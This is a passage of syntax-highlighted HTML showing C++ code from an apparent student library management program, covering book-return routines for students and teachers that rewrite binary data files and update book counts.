class="comment">//判断什么时候跳出此while循环</span></span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; judge;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					<span class="keyword">switch</span> (judge) &#123;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;Y&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							fstream reply_read;</span><br><span class="line">							fstream reply_write;</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (del_ownbook.ID == student_ID) &#123;</span><br><span class="line">									<span class="built_in">strcpy</span>(del_ownbook.ownbook_name, <span class="string">&quot;No Book&quot;</span>);</span><br><span class="line">									reply_write.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">									reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">									reply_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (del_ownbook.ID != student_ID) &#123;</span><br><span class="line">									reply_write.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">									reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">									reply_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::out);</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								reply_write.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">								reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								reply_write.<span class="built_in">close</span>();</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							mid1.book_num++;</span><br><span class="line">							writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">							writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">							writefile.<span class="built_in">clear</span>();</span><br><span class="line">							writefile.<span class="built_in">close</span>();</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							fstream reply_read;</span><br><span class="line">							fstream reply_write;</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (del_ownbook.ID == student_ID) &#123;</span><br><span class="line">									<span class="built_in">strcpy</span>(del_ownbook.ownbook_name, <span class="string">&quot;No Book&quot;</span>);</span><br><span class="line">									reply_write.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">									reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">									reply_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (del_ownbook.ID != student_ID) &#123;</span><br><span class="line">									reply_write.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">									reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">									reply_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::out);</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								reply_write.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">								reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								reply_write.<span class="built_in">close</span>();</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							mid1.book_num++;</span><br><span class="line">							writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">							writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">							writefile.<span class="built_in">clear</span>();</span><br><span class="line">							writefile.<span class="built_in">close</span>();</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">default</span>: &#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符! 请重新输入:\t&quot;</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		readfile1.<span class="built_in">close</span>();</span><br><span class="line">		<span class="comment">//*****注意关闭文件！未关闭文件时指针一直在文件结尾*****</span></span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">1</span>) &#123;</span><br><span class="line">			readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile1)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile1.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(mid2.book_name, reply.book_name)) &#123;</span><br><span class="line">					writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">					writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">					writefile.<span class="built_in">clear</span>();</span><br><span class="line">					writefile.<span class="built_in">close</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			readfile1.<span class="built_in">close</span>();</span><br><span class="line">			readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::out);</span><br><span class="line">			readfile1.<span class="built_in">close</span>();</span><br><span class="line">			readfile2.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile2.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile2)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile2.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">				writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.<span class="built_in">clear</span>();</span><br><span class="line">				writefile.<span class="built_in">close</span>();</span><br><span class="line">			&#125;</span><br><span class="line">			readfile2.<span class="built_in">close</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;是否要继续归还(Y/N):\t&quot;</span>;</span><br><span class="line">		<span class="keyword">char</span> judge1;</span><br><span class="line">		<span class="comment">//判断是否进行下一次添加</span></span><br><span class="line">		<span class="keyword">int</span> judge2 = <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//判断输入字符有效性</span></span><br><span class="line">		<span class="keyword">while</span> (judge2) &#123;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">			<span class="built_in">cin</span>.ignore();</span><br><span class="line">			<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入错误，请重新输入:\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//教师还书</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Teachers::repay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream readfile1;</span><br><span class="line">	fstream readfile2;</span><br><span class="line">	fstream writefile;</span><br><span class="line">	book reply;</span><br><span class="line">	book mid1;</span><br><span class="line">	book mid2;</span><br><span class="line">	teachers del_ownbook;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//判断书籍是否已存在</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要归还的书籍名:\t&quot;</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; reply.book_name;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">		<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!readfile1)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			readfile1.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(mid1.book_name, reply.book_name) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;馆内现有《&quot;</span> &lt;&lt; mid1.book_name &lt;&lt; <span class="string">&quot;》&quot;</span> &lt;&lt; mid1.book_num &lt;&lt; <span class="string">&quot;本&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				m = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****书籍信息*****\n&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍名称:\t&quot;</span> &lt;&lt; mid1.book_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍作者:\t&quot;</span> &lt;&lt; mid1.book_author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍位置:\t&quot;</span> &lt;&lt; mid1.book_location &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;是否确定归还？(Y/N)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">char</span> judge;</span><br><span class="line">				<span class="comment">//判断是否确定归还</span></span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">					<span class="comment">//判断什么时候跳出此while循环</span></span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; judge;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					<span class="keyword">switch</span> (judge) &#123;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;Y&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							fstream reply_read;</span><br><span class="line">							fstream reply_write;</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (del_ownbook.ID == teacher_ID) &#123;</span><br><span class="line">									<span class="built_in">strcpy</span>(del_ownbook.ownbook_name, <span class="string">&quot;No Book&quot;</span>);</span><br><span class="line">									reply_write.<span class="built_in">open</span>(<span class="string">&quot;teachers_info_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">									reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">									reply_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (del_ownbook.ID != teacher_ID) &#123;</span><br><span class="line">									reply_write.<span class="built_in">open</span>(<span class="string">&quot;teachers_info_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">									reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">									reply_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::out);</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								reply_write.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">								reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								reply_write.<span class="built_in">close</span>();</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							mid1.book_num++;</span><br><span class="line">							writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">							writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">							writefile.<span class="built_in">clear</span>();</span><br><span class="line">							writefile.<span class="built_in">close</span>();</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							fstream reply_read;</span><br><span class="line">							fstream reply_write;</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (del_ownbook.ID == teacher_ID) &#123;</span><br><span class="line">									<span class="built_in">strcpy</span>(del_ownbook.ownbook_name, <span class="string">&quot;No Book&quot;</span>);</span><br><span class="line">									reply_write.<span class="built_in">open</span>(<span class="string">&quot;teachers_info_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">									reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">									reply_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (del_ownbook.ID != teacher_ID) &#123;</span><br><span class="line">									reply_write.<span class="built_in">open</span>(<span class="string">&quot;teachers_info_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">									reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">									reply_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::out);</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							reply_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!reply_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!reply_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								reply_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								reply_write.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">								reply_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;del_ownbook, <span class="keyword">sizeof</span> del_ownbook);</span><br><span class="line">								reply_write.<span class="built_in">close</span>();</span><br><span class="line">							&#125;</span><br><span class="line">							reply_read.<span class="built_in">close</span>();</span><br><span class="line">							mid1.book_num++;</span><br><span class="line">							writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">							writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">							writefile.<span class="built_in">clear</span>();</span><br><span class="line">							writefile.<span class="built_in">close</span>();</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">default</span>: &#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符! 请重新输入:\t&quot;</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		readfile1.<span class="built_in">close</span>();</span><br><span class="line">		<span class="comment">//*****注意关闭文件！未关闭文件时指针一直在文件结尾*****</span></span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">1</span>) &#123;</span><br><span class="line">			readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile1)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile1.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(mid2.book_name, reply.book_name)) &#123;</span><br><span class="line">					writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">					writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">					writefile.<span class="built_in">clear</span>();</span><br><span class="line">					writefile.<span class="built_in">close</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			readfile1.<span class="built_in">close</span>();</span><br><span class="line">			readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::out);</span><br><span class="line">			readfile1.<span class="built_in">close</span>();</span><br><span class="line">			readfile2.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile2.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile2)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile2.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">				writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.<span class="built_in">clear</span>();</span><br><span class="line">				writefile.<span class="built_in">close</span>();</span><br><span class="line">			&#125;</span><br><span class="line">			readfile2.<span class="built_in">close</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;是否要继续归还(Y/N):\t&quot;</span>;</span><br><span class="line">		<span class="keyword">char</span> judge1;</span><br><span class="line">		<span class="comment">//判断是否进行下一次添加</span></span><br><span class="line">		<span class="keyword">int</span> judge2 = <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//判断输入字符有效性</span></span><br><span class="line">		<span class="keyword">while</span> (judge2) &#123;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">			<span class="built_in">cin</span>.ignore();</span><br><span class="line">			<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入错误，请重新输入:\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
